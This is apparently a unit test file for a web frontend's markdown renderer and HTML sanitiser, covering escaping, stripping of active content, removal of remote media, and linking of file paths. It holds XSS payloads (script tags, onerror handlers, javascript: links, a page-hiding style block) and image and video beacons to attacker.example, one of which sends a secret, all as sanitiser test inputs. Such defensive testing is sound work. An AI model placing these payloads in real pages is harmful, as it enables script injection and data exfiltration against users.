// renderMarkdownHtml 单测：marked 单一渲染入口（全前端共用）。
// 关键契约：表格包 .md-table-wrap（宽表横向滚动不压列）、breaks 语义、
// 非 table 标签不受包装影响、raw HTML 消毒（2026-09-26 挂账高优 Canvas-#2）。
import { describe, expect, it } from 'vitest'
import { escapeHtml, renderMarkdownHtml } from '../markdown'

// ---- escapeHtml：v-html 渲染面异常降级路径的兜底原语（单一真相源）----
// 契约：&<>"' 全量转义（属性上下文也安全）；空值回空串；活动内容
// （script/事件属性）经转义后成为惰性纯文本。

describe('escapeHtml', () => {
  it('五个危险字符全量转义', () => {
    expect(escapeHtml(`&<>"'`)).toBe('&amp;&lt;&gt;&quot;&#39;')
  })

  it('script 标签转义后成惰性文本（不再有 <script 开标签）', () => {
    const out = escapeHtml('<script>alert(1)</script>')
    expect(out).toBe('&lt;script&gt;alert(1)&lt;/script&gt;')
    expect(out.toLowerCase()).not.toContain('<script')
  })

  it('img onerror 向量转义后引号不截断属性上下文', () => {
    const out = escapeHtml('<img src="x" onerror=\'alert(1)\'>')
    expect(out).toContain('&lt;img')
    expect(out).not.toContain('<img')
    expect(out).toContain('&quot;x&quot;')
  })

  it('空串/空值回空串', () => {
    expect(escapeHtml('')).toBe('')
  })

  it('普通文本直通不受影响', () => {
    expect(escapeHtml('普通中文与 English 123')).toBe('普通中文与 English 123')
  })
})

describe('renderMarkdownHtml', () => {
  it('表格包裹 .md-table-wrap（thead/tbody 结构保持）', () => {
    const html = renderMarkdownHtml('| a | b |\n|---|---|\n| 1 | 2 |')
    expect(html).toContain('<div class="md-table-wrap"><table>')
    expect(html).toContain('</table></div>')
    expect(html).toContain('<thead>')
    expect((html.match(/md-table-wrap/g) || []).length).toBe(1)
  })

  it('多表格各自包裹，互不嵌套错位', () => {
    const html = renderMarkdownHtml(
      '| a |\n|---|\n| 1 |\n\ntext\n\n| b |\n|---|\n| 2 |',
    )
    expect((html.match(/<div class="md-table-wrap"><table>/g) || []).length).toBe(2)
    expect((html.match(/<\/table><\/div>/g) || []).length).toBe(2)
    expect(html.indexOf('<div class="md-table-wrap"')).toBeLessThan(html.indexOf('text'))
  })

  it('非表格输出不受包装影响（代码块含 table 字样不被误包）', () => {
    const html = renderMarkdownHtml('```html\n<table><tr><td>x</td></tr></table>\n```')
    expect(html).not.toContain('<div class="md-table-wrap">')
    expect(html).toContain('&lt;table&gt;')
  })

  it('breaks=true：单换行成 <br>（聊天语义）', () => {
    expect(renderMarkdownHtml('a\nb', { breaks: true })).toContain('<br>')
  })

  it('breaks 缺省 false：单换行不成 <br>（文档语义）', () => {
    expect(renderMarkdownHtml('a\nb')).not.toContain('<br>')
  })

  // ---- 消毒闸（Canvas-#2）：marked 默认放行 raw HTML，模型漏包/被注入的
  // 活动内容必须在这里被剥掉；正常格式（链接/表格/代码）不受影响。 ----

  it('script 标签被剥除', () => {
    const html = renderMarkdownHtml('前文 <script>alert(1)</script> 后文')
    expect(html).not.toContain('<script')
    expect(html).not.toContain('alert(1)')
    expect(html).toContain('前文')
    expect(html).toContain('后文')
  })

  it('事件属性被剥除（img onerror 向量；data:image 内联源存活——远程媒体契约）', () => {
    const html = renderMarkdownHtml(
      '<img src="data:image/png;base64,iVBORw0KGgo=" onerror="alert(1)">',
    )
    expect(html).toContain('<img')
    expect(html).not.toContain('onerror')
    expect(html).not.toContain('alert(1)')
  })

  it('javascript: 链接 href 被中性化，普通链接保留', () => {
    const evil = renderMarkdownHtml('[点我](javascript:alert(1))')
    expect(evil.toLowerCase()).not.toContain('javascript:')
    const good = renderMarkdownHtml('[官网](https://example.com)')
    expect(good).toContain('href="https://example.com"')
  })

  it('iframe/object/embed 等活动嵌入被剥除', () => {
    const html = renderMarkdownHtml(
      '<iframe src="https://evil"></iframe><object data="x"></object><embed src="x">',
    )
    expect(html).not.toContain('<iframe')
    expect(html).not.toContain('<object')
    expect(html).not.toContain('<embed')
  })

  it('style 属性被剥除（expression/exfil 向量），强调等内联格式保留', () => {
    const html = renderMarkdownHtml('<b style="x:1">粗</b> 和 **强**')
    expect(html).not.toContain('style=')
    expect(html).toContain('<b>粗</b>')
    expect(html).toContain('<strong>强</strong>')
  })

  it('style 标签被剥除（BUG-20261113-154：DOMPurify 默认白名单放行 <style> 元素，FORBID_ATTR 只禁属性禁不了标签——页面级 CSS defacement 向量）', () => {
    const html = renderMarkdownHtml(
      '前文\n\n<style>body{display:none!important}#app{position:fixed;inset:0;background:#fff;z-index:99999}</style>\n\n后文',
    )
    expect(html.toLowerCase()).not.toContain('<style')
    expect(html).not.toContain('display:none')
    expect(html).toContain('前文')
    expect(html).toContain('后文')
  })

  // ---- 远程媒体剥离（BUG-20261115-033）：DOMPurify 默认放行远程/相对
  // src 的 img/video/audio——渲染即静默外呼（信标/外传）。仅 data:image/*
  // 存活；srcset 逐候选过滤、poster 摘属性、无源容器连体移除。 ----

  it('远程 http img 被整体移除，正文保留', () => {
    const html = renderMarkdownHtml(
      '前文\n\n<img src="https://attacker.example/beacon?d=secret">\n\n后文',
    )
    expect(html).not.toContain('<img')
    expect(html).not.toContain('attacker.example')
    expect(html).toContain('前文')
    expect(html).toContain('后文')
  })

  it('markdown 图片语法 ![alt](http) 同样被剥', () => {
    const html = renderMarkdownHtml('![外传](http://attacker.example/pixel)')
    expect(html).not.toContain('<img')
    expect(html).not.toContain('attacker.example')
  })

  it('data:image 内联图存活（皮肤引擎 ALLOWED_DATA_URLS 同款契约）', () => {
    const html = renderMarkdownHtml('<img src="data:image/png;base64,iVBORw0KGgo=">')
    expect(html).toContain('<img')
    expect(html).toContain('data:image/png;base64,iVBORw0KGgo=')
  })

  it('同源相对路径 src 也被移除（可探达 gateway GET 端点）', () => {
    const html = renderMarkdownHtml('<img src="/api/internal/estop">')
    expect(html).not.toContain('<img')
    expect(html).not.toContain('/api/internal/estop')
  })

  it('video/audio 远程 src 被整体移除', () => {
    const html = renderMarkdownHtml(
      '<video src="https://attacker.example/v.mp4"></video><audio src="https://attacker.example/a.mp3"></audio>',
    )
    expect(html).not.toContain('<video')
    expect(html).not.toContain('<audio')
    expect(html).not.toContain('attacker.example')
  })

  it('video 子 source 远程源被剥，容器无源连体移除', () => {
    const html = renderMarkdownHtml(
      '<video><source src="https://attacker.example/v.mp4" type="video/mp4"></video>',
    )
    expect(html).not.toContain('<video')
    expect(html).not.toContain('attacker.example')
  })

  it('远程 poster 触发容器移除（poster 摘属性后无可用源）', () => {
    const html = renderMarkdownHtml('<video poster="https://attacker.example/p.jpg"></video>')
    expect(html).not.toContain('<video')
    expect(html).not.toContain('attacker.example')
  })

  it('track 远程字幕源被剥，无源 video 连体移除', () => {
    const html = renderMarkdownHtml('<video><track src="https://attacker.example/c.vtt"></video>')
    expect(html).not.toContain('<video')
    expect(html).not.toContain('attacker.example')
  })

  it('srcset 逐候选过滤：非法候选剔除、合法候选保留', () => {
    const html = renderMarkdownHtml(
      '<img srcset="https://attacker.example/1x.png 1x, data:image/gif;base64,R0lGOD= 2x">',
    )
    expect(html).not.toContain('attacker.example')
    expect(html).toContain('data:image/gif;base64,R0lGOD=')
    expect(html).toContain('<img')
  })

  it('srcset 全不安全 → 属性摘除且 img 死亡移除', () => {
    const html = renderMarkdownHtml(
      '<img srcset="https://a.example/1.png 1x, https://b.example/2.png 2x">',
    )
    expect(html).not.toContain('<img')
  })

  it('picture 内 source 远程 srcset 被剥，内联 img 存活', () => {
    const html = renderMarkdownHtml(
      '<picture><source srcset="https://attacker.example/x.png"><img src="data:image/png;base64,iVBOR="></picture>',
    )
    expect(html).not.toContain('attacker.example')
    expect(html).toContain('data:image/png;base64,iVBOR=')
  })

  it('无媒体 HTML 幂等直通（快路径不受影响）', () => {
    const html = renderMarkdownHtml('纯文本与 [链接](https://example.com) 不受媒体闸影响')
    expect(html).toContain('href="https://example.com"')
    expect(html).not.toContain('<img')
  })
})

// ---- 文件路径 linkify（问题 2：聊天里的文件路径可点击打开）----
// 契约：三类路径成链（Windows 绝对 / 带目录相对 / 白名单裸文件名）、
// 普通英文不成链、尾部标点不吞、<a> 内与 <pre> 代码块内跳过。

describe('renderMarkdownHtml linkify（文件路径）', () => {
  // 锚点属性序列化顺序固定：class → data-path → title（创建顺序），故
  // data-path 恒为第二属性，匹配到闭引号即可（后随 title）。
  const links = (html: string) => html.match(/<a class="file-link" data-path="[^"]*"/g) || []
  const paths = (html: string) =>
    [...html.matchAll(/data-path="([^"]*)"/g)].map((m) => m[1])

  it('Windows 绝对路径成链（含行内代码形态）', () => {
    const html = renderMarkdownHtml('报告已生成：`C:\\AI\\workspace\\reports\\总结.md`')
    expect(links(html).length).toBe(1)
    expect(paths(html)[0]).toBe('C:\\AI\\workspace\\reports\\总结.md')
  })

  it('带目录相对路径与裸白名单文件名成链', () => {
    const html = renderMarkdownHtml('见 docs/总结.md 与 README.md')
    expect(paths(html).sort()).toEqual(['README.md', 'docs/总结.md'])
  })

  it('带目录但非白名单扩展不成链（src/utils/markdown.ts）', () => {
    const html = renderMarkdownHtml('改了 src/utils/markdown.ts')
    expect(links(html).length).toBe(0)
  })

  it('普通英文与无扩展名相对 token 不成链', () => {
    const html = renderMarkdownHtml('and/or not a path v1.2 config_value')
    expect(links(html).length).toBe(0)
  })

  it('裸文件名只认白名单扩展名（evil.bat / run.ps1 不成链）', () => {
    const html = renderMarkdownHtml('附件 evil.bat 与 run.ps1')
    expect(links(html).length).toBe(0)
  })

  it('尾部标点不吞进链接（句号/右括号留在链外）', () => {
    const html = renderMarkdownHtml('报告在 reports/a.md。详情见 (notes/plan.md)。')
    expect(paths(html)).toContain('reports/a.md')
    expect(paths(html)).toContain('notes/plan.md')
    expect(html).toContain('</a>。')
  })

  it('已有链接内与代码块内不二次成链', () => {
    const html = renderMarkdownHtml(
      '[官网](https://example.com/C:\\x\\a.md) 与\n\n```\nC:\\no\\link.md\n```',
    )
    expect(paths(html)).not.toContain('C:\\x\\a.md')
    expect(paths(html)).not.toContain('C:\\no\\link.md')
  })

  it('多个路径各自成链且正文完整保留', () => {
    const html = renderMarkdownHtml('A.md 和 logs/run.log 都在')
    expect(links(html).length).toBe(2)
    expect(html).toContain('和')
    expect(html).toContain('都在')
  })
})

// ---- 锚规范化：markdown 链接语法 [label](path) 与纯文本路径同一真相源 ----
// 契约：scheme-less 路径 href 收编 file-link（剥 :行号）、http(s) 补
// target=_blank、页内锚点/mailto 不动、协议相对 // 与裸词解包为纯文本
// （消灭浏览器导航面）。

describe('renderMarkdownHtml 锚规范化（markdown 链接收编）', () => {
  const paths = (html: string) =>
    [...html.matchAll(/data-path="([^"]*)"/g)].map((m) => m[1])

  it('markdown 链接里的相对路径收编为 file-link（label 保留、href 摘除）', () => {
    const html = renderMarkdownHtml('[归档](.bug_hunter/HUNT/报告.md)')
    expect(paths(html)).toEqual(['.bug_hunter/HUNT/报告.md'])
    expect(html).toContain('>归档</a>')
    expect(html).not.toContain('href=')
    expect(html).toContain('title="打开文件"')
  })

  it('href 带 :行号 后缀 → data-path 剥离行号（用户实际案例形态）', () => {
    const html = renderMarkdownHtml(
      '[归档](.bug_hunter/HUNT/2026_11_26_320_发布标签全仓验证.md:1)',
    )
    expect(paths(html)).toEqual(['.bug_hunter/HUNT/2026_11_26_320_发布标签全仓验证.md'])
  })

  it('中文路径 href（marked encodeURI 百分号编码）解码后收编', () => {
    const html = renderMarkdownHtml('[报告](docs/发布标签全仓验证.md)')
    expect(paths(html)).toEqual(['docs/发布标签全仓验证.md'])
  })

  it('Windows 盘符路径 href：DOMPurify 上游整体摘除（无导航、label 保留，到不了收编层）', () => {
    // DOMPurify 的 URI 正则带 /i 旗标，`[^a-z]` 连大写字母一起排除——`C:`
    // 被当 scheme 拒绝，href 连属性一起消失。契约 = 不产生导航面也不产生
    // file-link（绝对路径 file-link 只来自纯文本 linkify arm）。
    const html = renderMarkdownHtml('[打开](C:\\AI\\workspace\\reports\\x.md)')
    expect(html).not.toContain('href=')
    expect(paths(html).length).toBe(0)
    expect(html).toContain('打开')
  })

  it('非白名单扩展 href（src/x.ts）不成 file-link', () => {
    const html = renderMarkdownHtml('[代码](src/utils/x.ts)')
    expect(paths(html).length).toBe(0)
    expect(html).not.toContain('href=')
  })

  it('https 链接补 target=_blank + rel noopener（不把 Dashboard 导航走）', () => {
    const html = renderMarkdownHtml('[官网](https://example.com)')
    expect(html).toContain('href="https://example.com"')
    expect(html).toContain('target="_blank"')
    expect(html).toContain('rel="noopener noreferrer"')
  })

  it('页内锚点不动', () => {
    const html = renderMarkdownHtml('[跳转](#section-1)')
    expect(html).toContain('href="#section-1"')
    expect(html).not.toContain('target="_blank"')
    expect(paths(html).length).toBe(0)
  })

  it('mailto: 不动', () => {
    const html = renderMarkdownHtml('[邮件](mailto:a@b.example)')
    expect(html).toContain('href="mailto:a@b.example"')
    expect(html).not.toContain('target="_blank"')
    expect(paths(html).length).toBe(0)
  })

  it('协议相对 // 解包为纯文本（导航面消灭、label 保留）', () => {
    const html = renderMarkdownHtml('[注入](//evil.example/x)')
    expect(html).not.toContain('<a')
    expect(html).not.toContain('href=')
    expect(html).toContain('注入')
  })

  it('裸词 href（非路径形态）解包为纯文本', () => {
    const html = renderMarkdownHtml('[foo](bar)')
    expect(html).not.toContain('<a')
    expect(html).toContain('foo')
  })

  it('解包出的路径文本被 linkify 收编（unwrap 与 linkify 两 pass 串联）', () => {
    const html = renderMarkdownHtml('[docs/总结.md](占位词)')
    expect(paths(html)).toEqual(['docs/总结.md'])
  })

  // ---- 广度面：锚规范化对所有锚产生形态一视同仁（marked 各种产出通路）----

  it('尖括号 autolink <https://x> 补 target（不导航走页面）', () => {
    const html = renderMarkdownHtml('文档见 <https://example.com/a>')
    expect(html).toContain('href="https://example.com/a"')
    expect(html).toContain('target="_blank"')
    expect(html).toContain('rel="noopener noreferrer"')
  })

  it('引用链接（reference link）同样补 target', () => {
    const html = renderMarkdownHtml('[官网][1]\n\n[1]: https://example.com')
    expect(html).toContain('href="https://example.com"')
    expect(html).toContain('target="_blank"')
  })

  it('raw HTML 锚（非 markdown 语法）同样收编——同一真相源不分语法', () => {
    const html = renderMarkdownHtml('<a href="docs/x.md">说明</a>')
    expect(paths(html)).toEqual(['docs/x.md'])
    expect(html).toContain('>说明</a>')
    expect(html).not.toContain('href=')
  })

  it('带 title 的链接收编后 title 覆写为「打开文件」', () => {
    const html = renderMarkdownHtml('[x](y.md "原标题")')
    expect(paths(html)).toEqual(['y.md'])
    expect(html).toContain('title="打开文件"')
    expect(html).not.toContain('原标题')
  })

  it('加粗包裹的链接（strong > a.file-link）收编不受层级影响', () => {
    const html = renderMarkdownHtml('**[归档](x.md)**')
    expect(paths(html)).toEqual(['x.md'])
    expect(html).toContain('<strong>')
  })

  it('列表项里的链接收编', () => {
    const html = renderMarkdownHtml('- 第一条\n- [报告](reports/a.md)\n- 第三条')
    expect(paths(html)).toEqual(['reports/a.md'])
  })

  it('单消息混合形态三臂各归其位（https/path/裸词）', () => {
    const html = renderMarkdownHtml('[外网](https://a.example) [文件](x.md) [裸](word)')
    expect(html).toContain('href="https://a.example"')
    expect(html).toContain('target="_blank"')
    expect(paths(html)).toEqual(['x.md'])
    expect(html).not.toContain('href="word"')
    expect(html.match(/<a /g)?.length).toBe(2)
  })

  it('breaks:true 聊天语义下收编行为一致', () => {
    const html = renderMarkdownHtml('完成 [归档](logs/a.log:2)', { breaks: true })
    expect(paths(html)).toEqual(['logs/a.log'])
  })

  it('非 ASCII 未知协议 href 解包（DOMPurify 会摘 scheme，label 保留兜底）', () => {
    const html = renderMarkdownHtml('[应用](myapp://open/x)')
    expect(html).not.toContain('href=')
    expect(html).toContain('应用')
  })

  it('坏编码 href（%zz 非法百分号序列）解包——decode 失败按不可信处理', () => {
    const html = renderMarkdownHtml('[x](50%zz.md)')
    expect(html).not.toContain('<a')
    expect(html).not.toContain('href=')
    expect(html).toContain('x')
  })

  it('origin 绝对路径 href（/api/x.md）同样收编——消灭同源导航面（fs.open 诚实兜底）', () => {
    const html = renderMarkdownHtml('[接口](/api/share/x.md)')
    expect(paths(html)).toEqual(['/api/share/x.md'])
    expect(html).not.toContain('href=')
  })

  it('大写 HTTPS 协议同样补 target（scheme 判定大小写不敏感）', () => {
    const html = renderMarkdownHtml('[官网](HTTPS://example.com/a)')
    expect(html).toContain('href="HTTPS://example.com/a"')
    expect(html).toContain('target="_blank"')
    expect(html).toContain('rel="noopener noreferrer"')
  })

  it('空标签链接 [](x.md) 收编后回填路径文本（与纯文本 arm 同源，不产生隐形可点区）', () => {
    const html = renderMarkdownHtml('前文 [](x.md) 后文')
    expect(paths(html)).toEqual(['x.md'])
    expect(html).toContain('>x.md</a>')
    expect(html).toContain('title="打开文件"')
  })
})
